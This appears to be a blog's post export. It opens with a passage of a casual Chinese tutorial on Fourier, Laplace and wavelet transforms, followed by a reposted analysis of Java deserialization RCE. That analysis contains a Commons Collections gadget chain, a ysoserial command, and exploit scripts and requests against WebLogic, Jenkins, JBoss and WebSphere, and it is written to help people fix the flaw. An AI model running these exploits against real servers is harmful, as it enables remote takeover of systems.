,当然,这个时候,正弦值还仅仅是一个”正弦值”,现在你可以开始想象假如圆上的这个点现在开始动了起来,并开始绕圆逆时针旋转, 的值会如何变化呢?下面的图会告诉你答案 显然的,当我们引入动态的概念后,正弦函数随之而动,从一个定值变成了一个波,在信号处理中,我们称之为正弦波,高中的课本会告诉你正弦函数的性质和和差化积积化和差之类的公式,而我会告诉你正弦函数和其所对应的正弦波估计是信号处理中最重要最常用没有之一的重要工具 到这里既然我们说到波了,那么就不得不提几个问题和其对应的概念,现在你再看看上图,如果我们需要描述一个正弦波是不是需要下面几个问题,而这个问题的答案,对应了几个概念 这个点围绕的圆到底有多大—-&gt;波幅 这个点旋转的速度有多快—-&gt;角速度—&gt;频率 这个点最初的位置在哪里—-&gt;相位 当然,如果我们描述正弦波只能用上面的文字来说,未免显得不够专业,于是乎,我们用一个更加通用的公式来描述正弦波 其中,A表示振福,A越大,振福越大. 表示角速度,当然,角速度和频率 是对应关系,所以信号处理中常常也用角频率这种俗语来描述 表示相位,sin和cos两个正弦函数的差别其实也仅仅是相位不同 是这个正弦波的偏移,你可以理解为这个波在y轴上如何的上下移动,在信号处理中,这个会被统一到直流分量中(频率为0的波的波幅) 科普完上面的概念之后,要说傅里叶变换是怎么回事其实已经很容易了,现在我们来看傅里叶说过的一句话 “任何”周期信号都可以用一系列成谐波关系的正弦曲线来表示。\\ 我们先不讨论这句话的适用条件(狄里赫利条件),这句话简直牛逼大了,这表示下面这些信号 全部可以用下面这个式子来表示 (式1.0) 如果看不明白没关系,下面这张图能让你看个清楚,如何用正弦波组成一个近似的方波 图像来自wiki百科 那么,有什么意义呢,要知道,如果可以将信号分解为正弦函数的累加和,不就等于知道了这个信号是由哪些频率的正弦波构成了的么,同时,我们还能知道对应频率的波在信号中的能量和相位信息.\\ 举个很简单的声学例子,如果我们直接看一段声音信号的波形图,我们很难看出他是男声还是女声(别说男声的嗓门比较大波幅宽,河东狮吼了解下)但是从频域中我们就能够很容易分辨出来,毕竟女声的频域中,高频的能量占比会比较高 再举个很简单的图形学例子,如果把一张图像做频域分析,图像的低频代表着轮廓信息,高频代表着细节信息,相位代表位置信息,你要是想让图像变模糊,简单,把高频的能量压下来就行了,想让图像变尖锐,高频能量加上去就行了. 那么问题又来了,已知 ,我们如何把它分解为 的形式呢,实际上傅里叶变换需要解决的就是这一点,它的最终目的就是要将信号分解为上面这样的形式,好让我们把别通频率的正弦波信息给剥离出来 要说这个,我们就不得不谈谈三角函数的正交性了, 首先我们知道,对正弦波正无穷到负无穷内进行积分,其结果必定是0(主值积分，取周期)\\ 所以根据三角函数的积化和差公式,下面的推论都是成立的 这导致了一个很重要的概念 不同频率的正弦波相乘,对其周期积分后,其结果是0!\\ ======================================================= (我知道有人肯定会说,作者你胡说八道, 怎么会是0,老师告诉我它明明是发散的,你又忽悠我,关于这点我要说明一下,首先你的老师没说错,不过我也没有忽悠你,首先在大学高数求极限那些知识中,这个函数确实积分后是发散的,这个发散的具体原因是建立在 这种情况下的,也就是我们正常说的无穷积分,但是如果按这种玩法,基本上大半的信号处理函数都没法玩了,因此在信号处理的公式中比如傅里叶变换,默认都以柯西主值积分作为钦定的积分方式,打个比方定义 , 这种情况下,负无穷到正无穷的积分不就是0了么,所以这里我说明一下,傅里叶变换中使用的是柯西主值积分,整个无穷区间取周期倍) ======================================================= 这个概念我们又叫做波的相干性,比如给你一段信号,问你信号里有没有100HZ频率的正弦波信号,怎么办?简单,把这个信号和100hz的正弦波信号相乘,然后对其周期内积分,如果结果不是0,那么这个信号就含有100HZ的信号 那么剩下的问题就是如何求得该频率正弦波对应的幅度和相位了,实际上就是求式1.0的 和 下面我要甩点公式了,如果感到不适,可以选择跳过 利用三角函数的变换公式，(式1.0)可变形为 设 , 那么，上式变为 现在，让我们正式的引入正交性的性质，还记得检波手段么，这里，我们假设对 用 进行检波(说人话就是乘起来,然后为了方便计算对其在一个周期内积分)，那么就有 假设f(x)中含有 角频率的正弦波系数为 ，那么根据三角函数的正交性，上式就有 为什么会这样?你想啊,别的频率的波积分后全变0了,不就是剩下( )频率一样的情况了么.因此 进一步计算，可得 同样， 也可以使用相同的方式进行推导 因此，通过 我们可以知道这个波的波幅与相位： 好了,这个基本就是傅里叶变换中最核心的傅里叶级数了 不是很复杂吧,你是不是很疑惑,为什么长得和傅里叶变换的标准公式差的有点多呢,标准公式不是长得是这样么: 没关系,看看我们的欧拉公式 然后把欧拉公式代入傅里叶变换 你看,最终还不是换汤不换药,无非就是多了个复数,这个复数其实没有别的其它意义,作用就是在计算中和cos区分开来,扯到复平面上绕圈圈?没必要! 现在傅里叶变换讲完了,我们来看看拉普拉斯变换 真的,傅里叶搞懂了拉普拉斯变换基本上一句话就能讲完,如果不扯点傅里叶变换的东西,我估计会因为回答问题过于简短待会答案都被折叠了 先看看拉普拉斯变换公式 这搞毛呢,不就是傅里叶变换的公式乘以一个 么,只要搞懂为什么要这么干,我们就能理解拉普拉斯变换了 我们来看看下面这个信号图 是的,这个信号的毛病在于,他已经上天了,是的,它增长的速度太快了,而我们却要使用不能够”上天”的正弦函数去拟合它,这不是为难我胖虎么,这个时候,我们就得想起一句名言,要么解决问题,要么解决制造问题的人(信号),既然傅里叶变换无法制造一个同样上天的正弦信号来拟合,我们就把它原本的信号”掰弯”,那么如何”掰弯”呢,简单,乘以一个 就行了 然后图像就变成了这样 你看,这不就皆大欢喜了么,搞来搞去,拉普拉斯变换的意义无非就是把那些想要上天的函数掰弯,好最终变成那种适合做变换的函数,但是掰弯听起来不太专业,所以我们又管叫衰减因子 好了,现在能解决 的信号我们有傅里叶变换解决了,不能解决的信号有拉普拉斯变换解决了,感觉上是不是皆大欢喜,写个软件跑跑看呗 这时你一拍脑袋!不好,信号是连续的,而计算机上存储的数据是离散的,这可咋办好,没关系,我们可以这样,每隔一小段距离,取一个点,最后用的时候把这些点连起来,不就能变成原来的的信号了么,当然我们还得研究研究,这个一小段距离究竟得多小,才不至于让原信号失真,这个就得参考参考香农采样定律了 好的,现在我们把连续的信号换一下,换成离散的”点”,首先积分是不能用了,既然换成离散的了,积分对应的就应该变成累加符号 ,当然, 也是不能用了,这是一个连续信号的写法,而离散的一个一个的点得换成 ,其中的n表示第n个点,实际上就是时间变来的,当然 也不能用了,你想啊,我们要具体到某个点,这个点怎么表示,当然了,首先把 时间换成 索引号,然后 这个动态的角速度值换成具体的角度 好了,我们终于把连续信号的傅里叶变换变成了离散信号的傅里叶变换,写写看 令 得到 哎呀,一不小心把Z变换的公式也写出来了,原来搞了半天,不就是傅里叶变换的离散形式么. 最后总结一下 数学分析工具就是这样,当出现解决不了的问题之后,随之就会出现改进的方案,我们可以说,拉普拉斯变换是为了解决一些”太飘了”或者专业说法叫不收敛的信号,而z变换则用于解决了信号的存储和编码问题,那么,那么还有没有别的问题? 有的,从时域到频域,频域的时间信息消失了,你有没觉得之前我们分析的信号都太理想化了,现实中的信号往往随着时间而变化并非一成不变的,比如一辆车向你开来然后远去,你会听到声音从尖锐逐渐变得浑浊,这是多普勒效应造成的,而你收到的声音信号也由高频逐渐变为低频,而傅里叶变换只能告诉你信号中存在某种频率的信号,但却不能告诉你这个频率的信号是在什么时候出现的.它可能一直存在,或者只存在前半段信号里,可能存在后半段信号里.或者别的区间. 这个时候,又出现了傅里叶变换的改进版本,叫短时傅里叶变换.简单来说就是一段信号,假如这个信号长度是1秒,那么就每隔0.1秒就做一次傅里叶变换,总共做10次,这样,第一个变换的结果对应0-0.1s的信号频谱,第二个变换结果对应0.1-0.2s的信号频谱 虽然短时傅里叶提供了一个粗糙版本的方案把时间的概念引入频域,但无法解决信号拟合的问题,我们使用正弦波去拟合方波,我们就需要用无穷多个不同频率的正弦波去拟合以抵消时频间的能量差异,简单来说,一个方波我们用正弦波去拟合,最终会拟合成这个样子 为了解决上面两个问题,小波变换诞生了,要使用小波变换,在进行变换前首先需要挑选合适的母小波(也常常叫基波函数,以前实验室里经常被用来调侃:喲,你搞个基波啊),然后通过对母小波的平移和缩放,最终去拟合原信号,在平移的过程中,最终也把时间信息带入了频域(小波域)中,同时不同的母小波也更好解决了信号的拟合问题,当然,大多小波变换的核心原理,最终和傅里叶变换一样,利用了正交性来检波(有的基波没有正交性,例如morlet和mexican hat,这类小波在用于离散小波变换时有限制性) 那么如何挑选母小波呢?不用担心,数学大佬们为我们总结了一堆好用的母小波,按照响应的情况挑选就行了 什么,太简略了不过瘾? DBinary：傅里叶变换推导详解zhuanlan.zhihu.comDBinary：离散傅里叶变换DFT详解及应用zhuanlan.zhihu.comDBinary：从三角函数到离散傅里叶变换到语音识别再到图像频域鲁棒性水印zhuanlan.zhihu.comDBinary：详解离散余弦变换（DCT）zhuanlan.zhihu.com references: 奥本海姆大佬&lt;&lt;信号与系统&gt;&gt; &lt;&lt;离散时间信号处理&gt;&gt; 大佬是我心中永远的神 &lt;&lt;小波十讲&gt;&gt;他们说这本书是本好书,可惜我真没几章看的懂 &lt;&lt;数字语音处理理论与应用&gt;&gt; 声控福利,宅男必备,论如何秒变萝莉音忽悠沙雕网友","categories":[{"name":"傅里叶变换","slug":"傅里叶变换","permalink":"https://gschaos.club/categories/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/"}],"tags":[{"name":"数学","slug":"数学","permalink":"https://gschaos.club/tags/%E6%95%B0%E5%AD%A6/"}]},{"title":"Java反序列化漏洞","slug":"Java反序列化漏洞","date":"2019-08-18T16:00:00.000Z","updated":"2020-10-25T08:24:22.000Z","comments":true,"path":"Java反序列化漏洞/","link":"","permalink":"https://gschaos.club/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"Lib之过？Java反序列化漏洞通用利用分析 转自：https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/","text":"Lib之过？Java反序列化漏洞通用利用分析 转自：https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/ 背景2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客[3]中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。 然而事实上，博客作者并不是漏洞发现者。博客中提到，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行，当时并没有引起太大的关注，但是在博主看来，这是2015年最被低估的漏洞。 确实，Apache Commons Collections这样的基础库非常多的Java应用都在用，一旦编程人员误用了反序列化这一机制，使得用户输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的问题，博客中提到的WebLogic等存在此问题的应用可能只是冰山一角。 虽然从@gebl和@frohoff的报告到现在已经过去了将近一年，但是@breenmachine的博客中提到的厂商也依然没有修复，而且国内的技术人员对这个问题的关注依然较少。为了帮助大家更好的理解它，尽快避免和修复这些问题，本文对此做了一个深入的漏洞原理和利用分析，最后对上面提到的这些受影响的应用，在全球范围内做一个大概的统计。 Java反序列化漏洞简介序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，类ObjectInputStream类的readObject()方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复的样例代码： 1234567891011121314151617public static void main(String args[]) throws Exception &#123; String obj = &quot;hello world!&quot;; // 将序列化对象写入文件object.db中 FileOutputStream fos = new FileOutputStream(&quot;object.db&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); // 从文件object.db中读取数据 FileInputStream fis = new FileInputStream(&quot;object.db&quot;); ObjectInputStream ois = new ObjectInputStream(fis); // 通过反序列化恢复对象obj String obj2 = (String)ois.readObject(); ois.close();&#125; 问题在于，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。 所以这个问题的根源在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。 反序列化问题由来已久，且并非Java语言特有，在其他语言例如PHP和Python中也有相似的问题。@gebl和@frohoff的报告中所指出的并不是反序列化这个问题，而是一些公用库，例如Apache Commons Collections中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些应用的反序列化漏洞能够得以利用，就是依靠了Apache Commons Collections。这种库的存在极大地提升了反序列化问题的严重程度，可以比作在开启了ASLR地址随机化防御的系统中，出现了一个加载地址固定的共享库，或者类似twitter上的评论中的比喻： @breenmachine的博客中将漏洞归咎于Apache Commons Collections这个库，存在一定的误解。 利用Apache Commons Collections实现远程代码执行参考Matthias Kaiser在11月份的报告[1]，我们以Apache Commons Collections 3为例，来解释如何构造对象，能够让程序在反序列化，即调用readObject()时，就能直接实现任意代码执行。 Map类是存储键值对的数据结构，Apache Commons Collections中实现了类TransformedMap，用来对Map进行某种变换，只要调用decorate()函数，传入key和value的变换函数Transformer，即可从任意Map对象生成相应的TransformedMap，decorate()函数如下： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; Transformer是一个接口，其中定义的transform()函数用来将一个对象转换成另一个对象。如下所示： 123public interface Transformer &#123; public Object transform(Object input);&#125; 当Map中的任意项的Key或者Value被修改，相应的Transformer就会被调用。除此以外，多个Transformer还能串起来，形成ChainedTransformer。 Apache Commons Collections中已经实现了一些常见的Transformer，其中有一个可以通过调用Java的反射机制来调用任意函数，叫做InvokerTransformer，代码如下： 123456789101112131415161718192021222324252627282930public class InvokerTransformer implements Transformer, Serializable &#123;... public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; &#125; public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125; &#125;&#125; 只需要传入方法名、参数类型和参数，即可调用任意函数。因此要想任意代码执行，我们可以首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap，然后想办法去触发Map中的MapEntry产生修改（例如setValue()函数），即可触发我们构造的Transformer。 测试代码如下： 12345678910111213141516171819202122public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;; Transformer transformedChain = new ChainedTransformer(transformers); Map innerMap = new hashMap(); innerMap.put(&quot;value&quot;, &quot;value&quot;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(&quot;foobar&quot;);&#125; 当上面的代码运行到setValue()时，就会触发ChainedTransformer中的一系列变换函数：首先通过ConstantTransformer获得Runtime类，进一步通过反射调用getMethod找到invoke函数，最后再运行命令calc.exe。 但是目前的构造还需要依赖于触发Map中某一项去调用setValue()，我们需要想办法通过readObject()直接触发。 我们观察到java运行库中有这样一个类AnnotationInvocationHandler，这个类有一个成员变量memberValues是Map类型，如下所示： 123456789class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Class&lt;? extends Annotation&gt; type; private final Map&lt;String, Object&gt; memberValues; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; this.type = type; this.memberValues = memberValues; &#125; ... 更令人惊喜的是，AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数，如下所示： 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; all bets are off return; &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; // 此处触发一些列的Transformer memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 因此，我们只需要使用前面构造的Map来构造AnnotationInvocationHandler，进行序列化，当触发readObject()反序列化的时候，就能实现命令执行。另外需要注意的是，想要在调用未包含的package中的构造函数，我们必须通过反射的方式，综合生成任意代码执行的payload的代码如下： 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;; Transformer transformedChain = new ChainedTransformer(transformers); Map innerMap = new hashMap(); innerMap.put(&quot;value&quot;, &quot;value&quot;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, outerMap); File f = new File(&quot;payload.bin&quot;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(instance); out.flush(); out.close();&#125; 以上解释了如何通过Apache Commons Collections 3这个库中的代码，来构造序列化对象，使得程序在反序列化时可以立即实现任意代码执行。 我们可以直接使用工具ysoserial[2][5]来生成payload，当中包含了4种通用的payload：Apache Commons Collections 3和4，Groovy，Spring，只要目标应用的Class Path中包含这些库，ysoserial生成的payload即可让readObject()实现任意命令执行。 ysoserial当中针对Apache Commons Collections 3的payload也是基于TransformedMap和InvokerTransformer来构造的，而在触发时，并没有采用上文介绍的AnnotationInvocationHandler，而是使用了java.lang.reflect.Proxy中的相关代码来实现触发。此处不再做深入分析，有兴趣的读者可以参考ysoserial的源码。 漏洞利用实例利用过程概述首先拿到一个Java应用，需要找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。我们可以通过审计源码中对反序列化函数的调用（例如readObject()）来寻找，也可以直接通过对应用交互流量进行抓包，查看流量中是否包含java序列化数据来判断，java序列化数据的特征为以标记（ac ed 00 05）开头。 确定了反序列化输入点后，再考察应用的Class Path中是否包含Apache Commons Collections库（ysoserial所支持的其他库亦可），如果是，就可以使用ysoserial来生成反序列化的payload，指定库名和想要执行的命令即可： 1java -jar ysoserial-0.0.2-SNAPSHOT-all.jar CommonsCollections1 &#39;id &gt;&gt; &#x2F;tmp&#x2F;redrain&#39; &gt; payload.out 通过先前找到的传入对象方式进行对象注入，数据中载入payload，触发受影响应用中ObjectInputStream的反序列化操作，随后通过反射调用Runtime.getRunTime.exec即可完成利用。 WebLogic参照[3]中的方法，对安装包文件grep受影响的类InvokerTransformer： 12root@f45f0209fa11:/opt/OracleHome# grep -R InvokerTransformer ./Binary file ./oracle_common/modules/com.bea.core.apache.commons.collections.jar matches 接着通过寻找接收外部输入的点，来让我们发送序列化对象。 WebLogic外部只开了一个7001端口，这个端口接受HTTP，T3，SNMP协议，判断协议类型后再把数据路由到内部正确的位置，通过在server上抓包，发现走T3协议时携带了java序列化对象，所以我们只用把这个包文从序列化开始的标记（ac ed 00 05）后加入payload，重放这个数据，完成利用。 以下是breenmachine的完整利用脚本： 1234567891011121314151617181920212223242526#!/usr/bin/pythonimport socketimport syssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server_address = (sys.argv[1], int(sys.argv[2]))print &#x27;connecting to %s port %s&#x27; % server_addresssock.connect(server_address)# Send headersheaders=&#x27;t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n&#x27;print &#x27;sending &quot;%s&quot;&#x27; % headerssock.sendall(headers)data = sock.recv(1024)print &gt;&gt;sys.stderr, &#x27;received &quot;%s&quot;&#x27; % datapayloadObj = open(sys.argv[3],&#x27;rb&#x27;).read()payload=&#x27;&#x27;print &#x27;sending payload...&#x27;&#x27;&#x27;&#x27;outf = open(&#x27;payload.tmp&#x27;,&#x27;w&#x27;)outf.write(payload)outf.close()&#x27;&#x27;&#x27;sock.send(payload) 在weblogic的利用中，有个小坑是不能破坏原始T3协议数据中包装的java对象。 JenkinsJenkins是一个非常流行的CI工具，在很多企业的内网中都部署了这个系统，这个系统常常和企业的代码相关联，这次也受到了Java反序列化漏洞的影响，非常危险。 同样，通过grep受影响的类InvokerTransformer 12root@f45f0209fa11:/usr/share/jenkins# grep -R &quot;InvokerTransformer&quot; ./Binary file ./webapps/ROOT/WEB-INF/lib/commons-collections-3.2.1.jar matches 在开放的端口上抓包，定位到Jeenkins的CLI包文中的序列化开始标记（rO0）。 在发送CLI的第一个包文后： 1200000000 00 14 50 72 6f 74 6f 63 6f 6c 3a 43 4c 49 2d 63 ..Protoc ol:CLI-c00000010 6f 6e 6e 65 63 74 onnect 在标记位的地方将base64处理过的payload修改覆盖原始包文中的序列化对象，发包后，完成利用。 以下是@breenmachine的完整利用脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/python#usage: ./jenkins.py host port /path/to/payloadimport socketimport sysimport requestsimport base64host = sys.argv[1]port = sys.argv[2]#Query Jenkins over HTTP to find what port the CLI listener is onr = requests.get(&#x27;http://&#x27;+host+&#x27;:&#x27;+port)cli_port = int(r.headers[&#x27;X-Jenkins-CLI-Port&#x27;])#Open a socket to the CLI portsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server_address = (host, cli_port)print &#x27;connecting to %s port %s&#x27; % server_addresssock.connect(server_address)# Send headersheaders=&#x27;\\x00\\x14\\x50\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x3a\\x43\\x4c\\x49\\x2d\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74&#x27;print &#x27;sending &quot;%s&quot;&#x27; % headerssock.send(headers)data = sock.recv(1024)print &gt;&gt;sys.stderr, &#x27;received &quot;%s&quot;&#x27; % datadata = sock.recv(1024)print &gt;&gt;sys.stderr, &#x27;received &quot;%s&quot;&#x27; % datapayloadObj = open(sys.argv[3],&#x27;rb&#x27;).read()payload_b64 = base64.b64encode(payloadObj)payload=&#x27;&#x27;print &#x27;sending payload...&#x27;&#x27;&#x27;&#x27;outf = open(&#x27;payload.tmp&#x27;,&#x27;w&#x27;)outf.write(payload)outf.close()&#x27;&#x27;&#x27;sock.send(payload) JbossJboss受影响的情况就比之前Jenkins逊色不少，正如之前所说，要成功利用必须要找到程序接受外部输入的点，而此处的利用需要/invoker/jmx的支持，大部分情况下的实际场景，jboss都删除了jmx，所以让此处的利用大打折扣。 分析流程和之前一样，只不过此处接受的点在jmx上，所以通过的协议也和前两个不同，是HTTP协议，不再赘述，详细的jboss分析可以参看Exploit – JBoss。 利用如下： 1curl --header &#x27;Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue&#x27; --data-binary &#x27;@/tmp/payload.out&#x27; http://172.17.0.2:8080/invoker/JMXInvokerServlet 也可以看breenmachine给出的http请求报文： 1234567POST /invoker/JMXInvokerServlet HTTP/1.1Host: 172.17.0.2:8080Content-Type:application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValueContent-Length: 1434payload WebSphereWebSphere的利用相比较之前几个case就非常粗暴简单了，可惜的是很少会暴露在公网。 找到受影响的lib的位置。 1234567root@f45f0209fa11:/opt/server/IBM# find . -iname &quot;*commons*collection*&quot;./WebSphere/AppServer/optionalLibraries/Apache/Struts/1.1/commons-collections.jar./WebSphere/AppServer/optionalLibraries/Apache/Struts/1.2.4/commons-collections.jar./WebSphere/AppServer/plugins/com.ibm.ws.prereq.commons-collections.jar./WebSphere/AppServer/systemApps/LongRunningScheduler.ear/JobManagementWeb.war/WEB-INF/lib/commons-collections.jar./WebSphere/AppServer/systemApps/isclite.ear/commons-collections.jar./WebSphere/AppServer/deploytool/itp/plugins/com.ibm.websphere.v85_2.0.0.v20120621_2102/wasJars/com.ibm.ws.prereq.commons-collections.jar 查看端口开放情况后发现WebSphere默认起了10个端口监听所有接口，通过burp suite看到在请求websphere默认端口8880上有一个POST的请求，body中带有base64处理后的java序列化对象，同样的，标记位置仍然是”rO0”，我们将生成的payload做base64处理后覆盖之前的序列化对象即可利用。 123456789101112131415161718POST / HTTP/1.0Host: 127.0.0.1:8880Content-Type: text/xml; charset=utf-8Content-Length: 2646SOAPAction: &quot;urn:AdminService&quot;&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;SOAP-ENV:Header xmlns:ns0=&quot;admin&quot; ns0:WASRemoteRuntimeVersion=&quot;8.5.5.1&quot; ns0:JMXMessageVersion=&quot;1.2.0&quot; ns0:SecurityEnabled=&quot;true&quot; ns0:JMXVersion=&quot;1.2.0&quot;&gt;&lt;LoginMethod&gt;BasicAuth&lt;/LoginMethod&gt;&lt;/SOAP-ENV:Header&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:getAttribute xmlns:ns1=&quot;urn:AdminService&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;objectname xsi:type=&quot;ns1:javax.management.ObjectName&quot;&gt;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81am